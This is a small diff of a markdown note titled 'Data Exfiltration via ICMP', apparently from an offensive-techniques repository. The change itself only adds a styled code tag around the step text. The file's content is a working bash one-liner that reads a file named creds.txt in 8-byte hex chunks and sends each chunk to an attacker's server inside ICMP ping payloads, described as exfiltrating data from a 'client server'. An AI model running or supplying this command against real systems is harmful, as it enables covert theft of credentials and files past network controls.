@@ -1,6 +1,6 @@
 # Data Exfiltration via ICMP
 
-Step 1 )> Run the following command on the client server from linux command line to read the target file in fixed-size chunks and sent each chunk to our server (8 bytes) by embedding it into ICMP packets, effectively exfiltrating the data bit by bit.:
+<code style="color : greenyellow">Step 1 )> Run the following command on the client server from linux command line to read the target file in fixed-size chunks and sent each chunk to our server (8 bytes) by embedding it into ICMP packets, effectively exfiltrating the data bit by bit.:</code>
 ```bash
 xxd -p -c 8 creds.txt | while read h; do ping -c 1 -p $h <Server-IP>; done
 ```
